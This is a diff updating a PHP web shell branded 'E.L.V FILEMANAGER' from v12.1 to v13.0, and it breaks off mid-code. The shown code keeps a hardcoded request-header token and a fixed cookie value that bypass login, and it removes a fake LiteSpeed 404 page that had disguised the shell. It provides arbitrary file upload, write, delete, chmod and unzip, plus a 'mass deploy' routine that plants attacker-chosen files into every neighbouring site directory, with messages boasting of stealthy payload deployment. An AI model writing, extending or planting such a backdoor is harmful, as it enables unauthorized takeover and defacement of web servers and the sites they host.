@@ -7,11 +7,13 @@
 @set_time_limit(0);
 
 /**
- * PROJECT    : E.L.V FILEMANAGER v12.1
+ * PROJECT    : E.L.V FILEMANAGER v13.0
  * AUTHOR      : HxN@E.L.V
  * Telegram     : @HxNoname
- * STATUS       : READY TO ROCK N ROLL IN NEON NIGHTS!!
+ * EDITION       : CYBERPUNK METROCITY
 */
+
+$status_msg = '';
 
 // ==========================================
 // --- 1. CORE LOGIC & AUTO-REGISTER WRAPPER ---
@@ -59,34 +61,16 @@ if (!empty($api_payload)) {
     die($api_out); 
 }
 
-// ==========================================
-// --- 2. SECRET KEY ANTI-BOT & TACTICAL BYPASS ---
-// ==========================================
 if (isset($_SERVER['HTTP_X_AUTH_TOKEN']) && $_SERVER['HTTP_X_AUTH_TOKEN'] === 'WHY-ALWAYS-ME') {
     $_SESSION['shell_unlocked'] = true;
     $_SESSION['elv_logged_in'] = true;
-    @setcookie('Greetings', 'Noname@ELV', time() + (86400 * 30), "/");
-}
-
-if (!isset($_SESSION['shell_unlocked'])) {
-    if (isset($_GET['id']) && $_GET['id'] === '@elv') {
-        $_SESSION['shell_unlocked'] = true;
-        if (isset($_POST['cmd']) || isset($_FILES['u_f']) || isset($_GET['action']) || isset($_POST['mass_deploy'])) {
-            $_SESSION['elv_logged_in'] = true; 
-        }
-        header("Location: ?");
-        exit;
-    } else {
-        header("HTTP/1.1 404 Not Found");
-        echo '<!DOCTYPE html><html style="height:100%"><head><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /><title>404 Not Found</title><style>body{color:#444;margin:0;font:normal 14px/20px Arial,Helvetica,sans-serif;height:100%;background-color:#fff}.wrap{min-height:100%;position:relative}.content{text-align:center;width:100%;max-width:800px;margin:0 auto;position:absolute;top:30%;left:50%;transform:translateX(-50%)}h1{margin:0;font-size:120px;line-height:120px;font-weight:bold;color:#444}h2{margin-top:20px;font-size:30px;color:#444}p{color:#444}.footer{color:#f0f0f0;font-size:12px;padding:15px 30px;position:absolute;bottom:0;width:100%;box-sizing:border-box;background-color:#474747;border-top:1px solid rgba(0,0,0,0.15)}.footer a{color:#fff;text-decoration:none}@media(min-width:768px){h1{font-size:150px;line-height:150px}}</style></head><body><div class="wrap"><div class="content"><h1>404</h1><h2>Not Found</h2><p>The resource requested could not be found on this server!</p></div></div><div class="footer"><br>Proudly powered by <a href="http://www.litespeedtech.com/error-page">LiteSpeed Web Server</a><p style="margin:5px 0 0 0;color:#f0f0f0;">Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>';
-        exit;
-    }
+    @setcookie('Greetings', 'HxN×ELV', time() + (86400 * 30), "/");
 }
 
 // ==========================================
 // --- 3. KONFIGURASI AUTH LOGIN & COOKIE ---
 // ==========================================
-$auth_pass = "MrHaxorN0N4M3@ELV";
+$auth_hash = '$2y$10$QV3xZAon5YmMoATNva7scuUCv.gLlFPPrlBbgEoAAV.rMDJduhfka'; 
 
 $inner_bg  = "https://j.top4top.io/p_3778w2fza0.png"; 
 
@@ -114,9 +98,9 @@ if (isset($_GET['logout'])) {
 }
 
 if (isset($_POST['l_pass'])) {
-    if ($_POST['l_pass'] === $auth_pass) {
+    if (password_verify($_POST['l_pass'], $auth_hash)) {
         $_SESSION['elv_logged_in'] = true;
-        setcookie('Greetings', 'Noname@ELV', time() + (86400 * 30), "/"); 
+        setcookie('Greetings', 'HxN×ELV', time() + (86400 * 30), "/"); 
         header("Location: ?");
         exit;
     } else {
@@ -125,7 +109,7 @@ if (isset($_POST['l_pass'])) {
 }
 
 $is_logged_in = false;
-if ((isset($_SESSION['elv_logged_in']) && $_SESSION['elv_logged_in'] === true) || (isset($_COOKIE['Greetings']) && $_COOKIE['Greetings'] === 'Noname@ELV')) {
+if ((isset($_SESSION['elv_logged_in']) && $_SESSION['elv_logged_in'] === true) || (isset($_COOKIE['Greetings']) && $_COOKIE['Greetings'] === 'HxN×ELV')) {
     $is_logged_in = true;
     if (!isset($_SESSION['elv_logged_in'])) $_SESSION['elv_logged_in'] = true; 
 }
@@ -139,24 +123,24 @@ $bg_terminal_js = "
     canvasBg.width = window.innerWidth;
     canvasBg.height = window.innerHeight;
     const logsData = [
-        'root@elv:~# apt-get update && apt-get upgrade -y',
-        'root@elv:~# systemctl restart apache2',
-        'root@elv:~# tail -f /var/log/apache2/access.log',
-        '[ OK ] Connection established to remote host.',
-        'root@elv:~# netstat -tulpn | grep LISTEN',
+        'root@HxN×ELV:~# systemctl start neon-grid',
+        'root@HxN×ELV:~# traceroute 192.168.7.77',
+        'root@HxN×ELV:~# tail -f /var/log/cyberpunk.log',
+        '[ OK ] ELV mainframe connected.',
+        'root@HxN×ELV:~# netstat -tulpn | grep LISTEN',
         'tcp        0      0 0.0.0.0:80              0.0.0.0:* LISTEN',
         'tcp        0      0 0.0.0.0:443             0.0.0.0:* LISTEN',
-        '[*] Bypassing WAF security layers... [SUCCESS]',
-        '[+] Payload tactical-shell.php deployed successfully.',
-        'root@elv:~# id',
+        '[*] Hacking the Gibson... [SUCCESS]',
+        '[+] Payload deployed: cyberdeck_override.sh',
+        'root@HxN×ELV:~# id',
         'uid=0(root) gid=0(root) groups=0(root)',
-        'root@elv:~# uname -a',
-        'Linux elv-mainframe 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-1kali1 x86_64 GNU/Linux',
-        'root@elv:~# ./exploit.sh --target 192.168.1.100',
-        '[!] INTRUSION DETECTED: OVERRIDING PROTOCOL...',
-        'root@elv:~# clear'
+        'root@HxN×ELV:~# uname -a',
+        'Linux ELV-core 6.8.0-cyberdeck-amd64 #1 SMP Debian 6.8.12 x86_64 GNU/Linux',
+        'root@HxN×ELV:~# ./exploit.sh --target 10.0.0.42',
+        '[!] CYBERPUNK NEON GRID OVERLOAD: PROTOCOL BREACH DETECTED',
+        'root@HxN×ELV:~# clear'
     ];
-    const logColors = ['#0ff', '#f0f', '#ff003c', '#0f0', '#ffd700', '#0ff'];
+    const logColors = ['#ff1493', '#8a2be2', '#00e5ff', '#00ff88', '#ffd700', '#ff6600'];
     let currentLogs = [];
     let maxLines = Math.floor(canvasBg.height / 22);
     let startLines = Math.floor(maxLines / 1.2); 
@@ -173,16 +157,16 @@ $bg_terminal_js = "
     }
     setInterval(() => {
         ctxBg.clearRect(0, 0, canvasBg.width, canvasBg.height);
-        ctxBg.font = 'bold 13px monospace';
+        ctxBg.font = 'bold 14px monospace';
         for (let i = 0; i < currentLogs.length; i++) { 
             ctxBg.fillStyle = currentLogs[i].c;
-            ctxBg.shadowBlur = 8;
+            ctxBg.shadowBlur = 12;
             ctxBg.shadowColor = currentLogs[i].c;
             ctxBg.fillText(currentLogs[i].t, 15, 30 + (i * 22)); 
             ctxBg.shadowBlur = 0; 
         }
         if (Math.random() > 0.4) { addLogBg(); }
-    }, 350);
+    }, 300);
     window.addEventListener('resize', () => { 
         canvasBg.width = window.innerWidth; 
         canvasBg.height = window.innerHeight; 
@@ -197,116 +181,264 @@ $server_ip   = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethos
 $client_ip   = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'UNKNOWN_IP';
 $os_info     = php_uname('s') . ' ' . php_uname('m');
 $php_version = phpversion();
-
 if (!$is_logged_in) {
     ?>
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta name="secret-id" content="[ Dev HxrNoname © | E.L.V Engine ® ]">
-        <title>NONAME@E.L.V | AUTHENTICATION REQUIRED</title>
-        <style>
-        /* Force selection for CodeMirror */
-.CodeMirror, .CodeMirror-scroll, .CodeMirror-sizer, .CodeMirror-lines {
-    user-select: text !important;
-    -webkit-user-select: text !important;
-    -moz-user-select: text !important;
-    -ms-user-select: text !important;
-}
-
-/* Matikan backdrop-filter saat mengedit, karena kadang bikin glitch di selection */
-.container {
-    backdrop-filter: none !important;
-}
-            @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-            :root { --cyan: #00fff7; --magenta: #ff00aa; --blue: #0044ff; --dark: #0a0a0f; }
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body { background: var(--dark); color: var(--cyan); font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-            #terminal-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; opacity: 0.15; }
-            .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,247,0.03) 2px, rgba(0,255,247,0.03) 4px); pointer-events: none; z-index: 1; }
-            .cyber-frame { width: 92%; max-width: 620px; padding: 2px; background: linear-gradient(135deg, var(--cyan), var(--magenta)); border-radius: 6px; box-shadow: 0 0 40px rgba(0,255,247,0.3), 0 0 80px rgba(255,0,170,0.15); position: relative; z-index: 2; }
-            .inner-terminal { background: rgba(7,7,15,0.97); border-radius: 4px; padding: 30px 25px; display: flex; flex-direction: column; align-items: center; border: 1px solid rgba(0,255,247,0.15); }
-            .ascii-box { border: 1px solid var(--cyan); padding: 20px; margin: 0 auto 15px; display: inline-block; box-shadow: 0 0 20px rgba(0,255,247,0.2), inset 0 0 15px rgba(0,255,247,0.1); width: 100%; text-align: center; }
-            .ascii-logo { color: var(--cyan); text-shadow: 0 0 15px var(--cyan), 0 0 30px var(--cyan); font-size: 7px; text-align: center; font-weight: 700; line-height: 1.15; margin: 0; letter-spacing: 0; }
-            .ascii-box {
-    overflow-x: auto; /* Scroll horizontal kalau ASCII kepanjangan */
-    max-width: 100%;
-}
-            .term-output { font-size: 14px; line-height: 1.8; margin-bottom: 18px; color: var(--cyan); font-weight: 400; width: 100%; min-height: 120px; }
-            .cyan-text { color: var(--cyan); text-shadow: 0 0 8px var(--cyan); }
-            .magenta-text { color: var(--magenta); text-shadow: 0 0 8px var(--magenta); }
-            .gold-text { color: #ffd700; text-shadow: 0 0 10px #ffd700; }
-            #login-form { display: none; margin-top: 10px; border-top: 1px solid rgba(0,255,247,0.2); padding-top: 20px; animation: slideUp 0.4s ease-out; width: 100%; }
-            @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
-            .input-group { display: flex; align-items: center; margin-bottom: 15px; background: rgba(0,255,247,0.04); border: 1px solid rgba(0,255,247,0.4); border-left: 4px solid var(--cyan); padding: 12px 15px; transition: all 0.3s; }
-            .input-group:focus-within { background: rgba(0,255,247,0.08); border-color: var(--cyan); border-left: 4px solid var(--magenta); box-shadow: 0 0 20px rgba(0,255,247,0.1); }
-            .prompt { color: var(--cyan); margin-right: 12px; font-weight: 700; white-space: nowrap; font-size: 15px; text-shadow: 0 0 5px var(--cyan); }
-            input { background: transparent; border: none; color: var(--cyan); font-family: 'Share Tech Mono', monospace; font-size: 16px; width: 100%; padding: 5px; outline: none; letter-spacing: 2px; }
-            input:focus { text-shadow: 0 0 10px var(--cyan); }
-            input::placeholder { color: rgba(0,255,247,0.25); letter-spacing: 2px; }
-            button { width: 100%; padding: 14px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); font-family: 'Share Tech Mono', monospace; font-size: 16px; cursor: pointer; transition: all 0.3s; text-transform: uppercase; letter-spacing: 4px; font-weight: 700; text-shadow: 0 0 5px var(--cyan); position: relative; overflow: hidden; }
-            button::after { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(0,255,247,0.2), transparent); transition: 0.5s; }
-            button:hover::after { left: 100%; }
-            button:hover { background: rgba(0,255,247,0.1); color: #fff; box-shadow: 0 0 30px var(--cyan), inset 0 0 10px var(--cyan); border-color: var(--magenta); text-shadow: 0 0 12px #fff; }
-            .term-error { color: var(--magenta); font-weight: 700; margin-bottom: 15px; border: 1px solid var(--magenta); padding: 12px; text-align: center; background: rgba(255,0,170,0.1); font-size: 13px; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 0 20px rgba(255,0,170,0.3); width: 100%; }
-            .cursor { display: inline-block; width: 10px; height: 18px; background: var(--cyan); animation: blink 1s step-end infinite; vertical-align: middle; margin-left: 8px; box-shadow: 0 0 10px var(--cyan); }
-            @keyframes blink { 50% { opacity: 0; } }
-            @media (max-width: 600px) { .ascii-logo { font-size: 4px; } .ascii-box { padding: 12px; } .inner-terminal { padding: 20px 15px; } }
-        </style>
-    </head>
-    <body>
-        <canvas id="terminal-bg"></canvas>
-        <div class="scanline"></div>
-        <div class="cyber-frame">
-            <div class="inner-terminal">
-                <div class="ascii-box">
-                    <div class="ascii-logo">
-<pre style="margin:0; line-height:1.15; font-weight:700;">
-███████╗██╗    ██╗      ██╗    ███████╗ ███╗   ███╗    ██╗   ██╗ ██╗██████╗     ██████╗ 
-██╔════╝██║    ██║      ██║    ██╔════╝ ████╗ ████║    ██║   ██║███║╚════██╗   ██╔═████╗
-█████╗  ██║    ██║      ██║    █████╗   ██╔████╔██║    ██║   ██║╚██║ █████╔╝   ██║██╔██║
-██╔══╝  ██║    ╚██╗    ██╔╝    ██╔══╝   ██║╚██╔╝██║    ╚██╗ ██╔╝ ██║ ╚═══██╗   ████╔╝██║
-███████╗███████╗ ╚████╔╝      ██║██╗   ██║ ╚═╝ ██║     ╚████╔╝  ██║██████╔╝██╗╚██████╔╝
-╚══════╝╚══════╝  ╚═══╝      ╚═╝╚═╝     ╚═╝     ╚═╝      ╚═══╝   ╚═╝╚═════╝ ╚═╝ ╚════</pre>
-                    </div>
-                </div>
-                <div class="term-output" id="term-text"></div>
-                <?php if(isset($login_err)) echo "<div class='term-error'>[!] $login_err [!]</div>"; ?>
-                <form id="login-form" method="POST">
-                    <div class="input-group">
-                        <span class="prompt">access_key:~#</span>
-                        <input type="password" name="l_pass" placeholder="SECRET KEY" required autofocus>
-                    </div>
-                    <button type="submit">[ INITIATE CONNECTION ]</button>
-                </form>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="secret-id" content="[ Dev HxN © | E.L.V Engine ® ]">
+    <title>HxN×E.L.V | Cyberpunk Metrocity</title>
+    <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+    :root { 
+        --neon-pink: #ff1493;
+        --neon-cyan: #00e5ff; 
+        --neon-purple: #8a2be2; 
+        --neon-magenta: #ff00ff;
+        --neon-yellow: #ffd700;
+        --neon-green: #00ff88;
+        --neon-orange: #ff6600;
+        --neon-cyan-dim: #66f0ff;
+        --dark-bg: #0a0e27; 
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { 
+        background: linear-gradient(135deg, #2d0a4a 0%, #4a1a7a 30%, #2d0a4a 60%, #1a0533 100%);
+        color: #e0e0ff; 
+        font-family: 'Share Tech Mono', monospace; 
+        display: flex; 
+        justify-content: center; 
+        align-items: center; 
+        height: 100vh; 
+        overflow: hidden; 
+    }
+    body::before {
+        content: '';
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: 
+            radial-gradient(circle at 20% 30%, rgba(138,43,226,0.25) 0%, transparent 50%),
+            radial-gradient(circle at 80% 20%, rgba(75,0,130,0.2) 0%, transparent 50%),
+            radial-gradient(circle at 50% 80%, rgba(0,0,255,0.15) 0%, transparent 50%);
+        pointer-events: none;
+        z-index: 0;
+    }
+    #terminal-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; opacity: 0.7; }
+    .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(138,43,226,0.012) 2px, rgba(138,43,226,0.012) 4px); pointer-events: none; z-index: 1; }
+    .cyber-frame { 
+        width: 92%; max-width: 700px; padding: 4px; 
+        background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta), var(--neon-cyan)); 
+        background-size: 300% 300%;
+        animation: border-pulse 4s ease-in-out infinite;
+        border-radius: 8px; 
+        box-shadow: 0 0 50px rgba(138,43,226,0.5), 0 0 80px rgba(0,229,255,0.2); 
+        position: relative; z-index: 2; 
+    }
+    @keyframes border-pulse {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+    .inner-terminal { 
+        background: rgba(20, 5, 40, 0.95); 
+        border-radius: 5px; 
+        padding: 30px 24px; 
+        display: flex; 
+        flex-direction: column; 
+        align-items: center; 
+        border: 1px solid rgba(138,43,226,0.2); 
+    }
+    .logo-box { 
+        width: 100%; 
+        text-align: center; 
+        margin: 0 auto 12px; 
+        padding: 8px;
+    }
+    .logo-box img {
+        max-width: 80%;
+        height: auto;
+        opacity: 0.85;
+        filter: drop-shadow(0 0 15px rgba(138,43,226,0.4)) drop-shadow(0 0 30px rgba(0,229,255,0.2));
+        transition: all 0.3s ease;
+    }
+    .logo-box img:hover {
+        opacity: 1;
+        filter: drop-shadow(0 0 20px rgba(138,43,226,0.6)) drop-shadow(0 0 40px rgba(0,229,255,0.3));
+        transform: scale(1.02);
+    }
+    .term-output { font-size: 13px; line-height: 1.7; margin-bottom: 15px; color: #e0e0ff; font-weight: 400; width: 100%; min-height: 100px; }
+    .cyan-text { color: var(--neon-cyan); text-shadow: 0 0 6px rgba(0,229,255,0.35); }
+    .magenta-text { color: var(--neon-pink); text-shadow: 0 0 6px rgba(255,20,147,0.35); }
+    .gold-text { color: var(--neon-yellow); text-shadow: 0 0 6px rgba(255,215,0,0.35); }
+    .purple-text { color: var(--neon-purple); text-shadow: 0 0 6px rgba(138,43,226,0.35); }
+    #login-form { display: none; margin-top: 8px; border-top: 3px solid; border-image: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta)) 1; padding-top: 15px; animation: slideUp 0.4s ease-out; width: 100%; }
+    @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+    .input-group { 
+        display: flex; 
+        align-items: center; 
+        margin-bottom: 12px; 
+        background: rgba(255,255,255,0.02); 
+        border: 1px solid rgba(138,43,226,0.2); 
+        border-left: 4px solid var(--neon-cyan); 
+        padding: 12px 14px; 
+        transition: all 0.3s; 
+        border-radius: 4px;
+    }
+    .input-group:focus-within { 
+        background: rgba(0,229,255,0.03); 
+        border-color: var(--neon-cyan); 
+        border-left: 4px solid var(--neon-purple); 
+        box-shadow: 0 0 15px rgba(0,229,255,0.08); 
+    }
+    .prompt { 
+        color: var(--neon-magenta); 
+        margin-right: 10px; 
+        font-weight: 700; 
+        white-space: nowrap; 
+        font-size: 14px; 
+        text-shadow: 0 0 3px rgba(255,0,255,0.3); 
+    }
+    input { 
+        background: transparent; 
+        border: none; 
+        color: #e0e0ff; 
+        font-family: 'Share Tech Mono', monospace; 
+        font-size: 15px; 
+        width: 100%; 
+        padding: 4px; 
+        outline: none; 
+        letter-spacing: 2px; 
+    }
+    input:focus { text-shadow: 0 0 5px rgba(138,43,226,0.2); }
+    input::placeholder { color: rgba(138,43,226,0.2); letter-spacing: 2px; }
+    button { 
+        width: 100%; 
+        padding: 14px; 
+        background: transparent; 
+        border: 2px solid var(--neon-purple); 
+        color: var(--neon-cyan); 
+        font-family: 'Share Tech Mono', monospace; 
+        font-size: 15px; 
+        cursor: pointer; 
+        transition: all 0.3s; 
+        text-transform: uppercase; 
+        letter-spacing: 3px; 
+        font-weight: 700; 
+        text-shadow: 0 0 3px rgba(0,229,255,0.2); 
+        position: relative; 
+        overflow: hidden; 
+        border-radius: 4px;
+    }
+    button::after { 
+        content: ''; 
+        position: absolute; 
+        top: 0; left: -100%; 
+        width: 100%; height: 100%; 
+        background: linear-gradient(90deg, transparent, rgba(138,43,226,0.1), transparent); 
+        transition: 0.5s; 
+    }
+    button:hover::after { left: 100%; }
+    button:hover { 
+        background: rgba(138,43,226,0.05); 
+        color: #fff; 
+        box-shadow: 0 0 25px rgba(138,43,226,0.3), inset 0 0 8px rgba(138,43,226,0.03); 
+        border-color: var(--neon-magenta); 
+    }
+    .term-error { 
+        color: var(--neon-pink); 
+        font-weight: 700; 
+        margin-bottom: 12px; 
+        border: 2px solid var(--neon-pink); 
+        padding: 10px; 
+        text-align: center; 
+        background: rgba(255,20,147,0.04); 
+        font-size: 12px; 
+        text-transform: uppercase; 
+        letter-spacing: 1px; 
+        box-shadow: 0 0 15px rgba(255,20,147,0.12); 
+        width: 100%; 
+        border-radius: 4px;
+    }
+    .cursor { 
+        display: inline-block; 
+        width: 8px; 
+        height: 16px; 
+        background: var(--neon-cyan); 
+        animation: blink 1s step-end infinite; 
+        vertical-align: middle; 
+        margin-left: 6px; 
+        box-shadow: 0 0 6px rgba(0,229,255,0.3); 
+    }
+    @keyframes blink { 50% { opacity: 0; } }
+    @media (max-width: 600px) { .logo-box img { max-width: 95%; } .inner-terminal { padding: 15px 12px; } }
+    </style>
+</head>
+<body>
+    <canvas id="terminal-bg"></canvas>
+    <div class="scanline"></div>
+    <div class="cyber-frame">
+        <div class="inner-terminal">
+            <div class="logo-box">
+                <img src="https://d.top4top.io/p_3839nayyc0.png" alt="E.L.V">
             </div>
+            <div class="term-output" id="term-text"></div>
+            <?php if(isset($login_err)) echo "<div class='term-error'>[!] $login_err [!]</div>"; ?>
+            <form id="login-form" method="POST">
+                <div class="input-group">
+                    <span class="prompt">HxN×ELV:~#</span>
+                    <input type="password" name="l_pass" placeholder="ACCESS KEY" required autofocus>
+                </div>
+                <button type="submit">[ AUTHENTICATE TO METROCITY ]</button>
+            </form>
         </div>
-        <script>
-            <?= $bg_terminal_js ?>
-            const termText = document.getElementById("term-text"); const loginForm = document.getElementById("login-form"); const hasError = <?php echo isset($login_err) ? 'true' : 'false'; ?>; const sleep = ms => new Promise(r => setTimeout(r, ms));
-            async function bootSequence() {
-                if(hasError) { termText.innerHTML = "<div><span class='cyan-text'>[sys]</span> Auth token rejected.</div><div><span class='magenta-text'>[!] INITIATING DEFENSIVE PROTOCOL</span></div>"; loginForm.style.display = "block"; return; }
-                const seq = [
-                    { t: "<span class='cyan-text'>[*]</span> Establishing secure connection to <?= htmlspecialchars($target_host) ?>...", d: 10 },
-                    { t: "<span class='cyan-text'>[*]</span> Target IP resolved: <?= htmlspecialchars($server_ip) ?>", d: 10 },
-                    { t: "<span class='cyan-text'>[*]</span> Kernel architecture: <?= htmlspecialchars($os_info) ?>", d: 10 },
-                    { t: "<span class='cyan-text'>[*]</span> Bypassing WAF configurations... [SUCCESS]", d: 15 },
-                    { t: "<span class='cyan-text'>[*]</span> Mounting encrypted volumes...", d: 10 },
-                    { t: "<span class='gold-text'>[!]</span> AUTHENTICATION REQUIRED TO ACCESS MAINFRAME.<span class='cursor'></span>", d: 0 }
-                ];
-                for (let i = 0; i < seq.length; i++) { let row = document.createElement("div"); row.style.marginBottom = "5px"; termText.appendChild(row);
-                    if (seq[i].t.includes("<span")) { row.innerHTML = seq[i].t; await sleep(150); } else { for (let char of seq[i].t) { row.innerHTML += char; await sleep(seq[i].d); } await sleep(50); } }
-                loginForm.style.display = "block";
+    </div>
+    <script>
+        <?= $bg_terminal_js ?>
+        const termText = document.getElementById("term-text"); 
+        const loginForm = document.getElementById("login-form"); 
+        const hasError = <?php echo isset($login_err) ? 'true' : 'false'; ?>; 
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
+        
+        async function bootSequence() {
+            if(hasError) { 
+                termText.innerHTML = "<div><span class='cyan-text'>[sys]</span> Auth token rejected.</div><div><span class='magenta-text'>[!] INITIATING DEFENSIVE PROTOCOL</span></div>"; 
+                loginForm.style.display = "block"; 
+                return; 
             }
-            window.onload = bootSequence; 
-        </script>
-    </body>
-    </html>
-    <?php exit;
+            const seq = [
+                { t: "<span class='cyan-text'>[*]</span> Connecting to MetroCity mainframe...", d: 10 },
+                { t: "<span class='cyan-text'>[*]</span> Target resolved: <?= htmlspecialchars($server_ip) ?>", d: 10 },
+                { t: "<span class='cyan-text'>[*]</span> Kernel: <?= htmlspecialchars($os_info) ?>", d: 10 },
+                { t: "<span class='purple-text'>[*]</span> Bypassing neon grid encryption... [SUCCESS]", d: 15 },
+                { t: "<span class='purple-text'>[*]</span> Mounting encrypted volumes...", d: 10 },
+                { t: "<span class='gold-text'>[!]</span> AUTHENTICATION REQUIRED TO ACCESS METROCITY.<span class='cursor'></span>", d: 0 }
+            ];
+            for (let i = 0; i < seq.length; i++) { 
+                let row = document.createElement("div"); 
+                row.style.marginBottom = "5px"; 
+                termText.appendChild(row);
+                if (seq[i].t.includes("<span")) { 
+                    row.innerHTML = seq[i].t; 
+                    await sleep(150); 
+                } else { 
+                    for (let char of seq[i].t) { 
+                        row.innerHTML += char; 
+                        await sleep(seq[i].d); 
+                    } 
+                    await sleep(50); 
+                } 
+            }
+            loginForm.style.display = "block";
+        }
+        window.onload = bootSequence; 
+    </script>
+</body>
+</html>
+<?php exit;
 }
-
 // ================= EFFECTIVENESS INJECTION: safeName =================
 if (!function_exists('safeName')) {
     function safeName($name) {
@@ -323,6 +455,7 @@ if (!function_exists('safeName')) {
 
 $logo_inner = "https://j.top4top.io/p_3829bo8yg0.png";
 $elv_icon = "https://e.top4top.io/p_3767wkybq0.png";
+$shell_logo = "https://d.top4top.io/p_3839nayyc0.png";
 $base_shell = dirname(__FILE__);
 
 $dir = (isset($_GET['d'])) ? realpath($_GET['d']) : $base_shell;
@@ -376,59 +509,40 @@ if (isset($_POST['paste_f'])) {
     }
 }
 
-$status_msg = (isset($status_msg)) ? $status_msg : "";
 if (isset($_POST['save_f'])) { if(@file_put_contents($_POST['f_path'], $_POST['f_cnt'])) $status_msg = "[+] OVERRIDE SUCCESS: PAYLOAD [ " . basename($_POST['f_path']) . " ] INJECTED & SAVED"; }
 if (isset($_FILES['u_f'])) { if(@move_uploaded_file($_FILES['u_f']['tmp_name'], $dir.'/'.$_FILES['u_f']['name'])) $status_msg = "[+] UPLOAD SUCCESS: PAYLOAD [ " . $_FILES['u_f']['name'] . " ] DEPLOYED STEALTHILY"; }
 if (isset($_GET['del'])) { $t = $_GET['del']; if(is_dir($t) ? @rmdir($t) : @unlink($t)) $status_msg = "[-] WIPE SUCCESS: TARGET [ " . basename($t) . " ] TERMINATED & ERASED"; }
 if (isset($_POST['mk_f'])) { if(@file_put_contents($dir.'/'.$_POST['f_n'], "")) $status_msg = "[+] FILE CREATED: [ " . $_POST['f_n'] . " ] ESTABLISHED"; }
-if (isset($_POST['mk_d'])) { 
-    $safe_dir = safeName($_POST['d_n']);
-    if(@mkdir($dir.'/'.$safe_dir)) $status_msg = "[+] SECTOR CREATED: DIR [ " . $safe_dir . " ] ESTABLISHED"; 
-}
+if (isset($_POST['mk_d'])) { $safe_dir = safeName($_POST['d_n']); if(@mkdir($dir.'/'.$safe_dir)) $status_msg = "[+] SECTOR CREATED: DIR [ " . $safe_dir . " ] ESTABLISHED"; }
 if (isset($_POST['rename'])) { if(@rename($_POST['old'], $dir.'/'.$_POST['new'])) $status_msg = "[+] RENAME SUCCESS: [ " . basename($_POST['old']) . " ] ALTERED TO [ " . basename($_POST['new']) . " ]"; }
-if(isset($_POST['unzip_f'])) {
-    $zip_file = $_POST['c_path'];
-    $zip = new ZipArchive;
-    if ($zip->open($zip_file) === TRUE) {
-        $zip->extractTo($dir);
-        $zip->close();
-        echo "<script>alert('UNZIP SUCCESS!'); window.location='?d=".urlencode($dir)."';</script>";
-    } else {
-        echo "<script>alert('FAILED TO UNZIP!');</script>";
-    }
-}
+if(isset($_POST['unzip_f'])) { $zip_file = $_POST['c_path']; $zip = new ZipArchive; if ($zip->open($zip_file) === TRUE) { $zip->extractTo($dir); $zip->close(); echo "<script>alert('UNZIP SUCCESS!'); window.location='?d=".urlencode($dir)."';</script>"; } else { echo "<script>alert('FAILED TO UNZIP!');</script>"; } }
 if (isset($_POST['ch_mod'])) { if(@chmod($_POST['c_path'], octdec($_POST['c_perm']))) $status_msg = "[+] CHMOD SUCCESS: PRIVILEGE FOR [ " . basename($_POST['c_path']) . " ] UPDATED TO [ " . $_POST['c_perm'] . " ]"; }
-
-if (isset($_POST['mass_deploy'])) {
-    $target_root = $_POST['target_root'];
-    $file_name = $_POST['mass_name'];
-    $content = $_POST['mass_content'];
-    $count = 0; // Inisialisasi awal
-    $injected_targets = [];
-
-    if (is_dir($target_root)) {
-        $folders = scandir($target_root);
-        foreach ($folders as $folder) {
-            $path = $target_root . '/' . $folder;
-            if ($folder != '.' && $folder != '..' && is_dir($path)) {
-                if (@file_put_contents($path . '/' . $file_name, $content)) {
-                    $count++;
-                    $injected_targets[] = "[+] " . $folder . " -> " . $file_name;
-                }
-            }
-        }
-        
-        $status_msg = "SUCCESS: $count SECTORS INJECTED";
-        
-        // Output hasil yang bersih
-        if ($count > 0) {
-            $result_text = implode("\n", $injected_targets);
-            $status_msg .= "<br><br><b style='color:var(--magenta);'>[ RESULT MASS DEPLOY ]</b><br>";
-            $status_msg .= "<textarea style='width:100%; height:200px; margin-top:10px; background:rgba(0,0,0,0.8); border:1px solid var(--cyan); color:var(--cyan); font-family:monospace; padding:10px; resize:vertical;' readonly>" . htmlspecialchars($result_text) . "</textarea>";
-        }
-    } else {
-        $status_msg = "ERROR: TARGET ROOT NOT FOUND!";
-    }
+if (isset($_POST['mass_deploy'])) { 
+    $target_root = $_POST['target_root']; 
+    $file_name = $_POST['mass_name']; 
+    $content = $_POST['mass_content']; 
+    $count = 0; 
+    $injected_targets = []; 
+    if (is_dir($target_root)) { 
+        $folders = scandir($target_root); 
+        foreach ($folders as $folder) { 
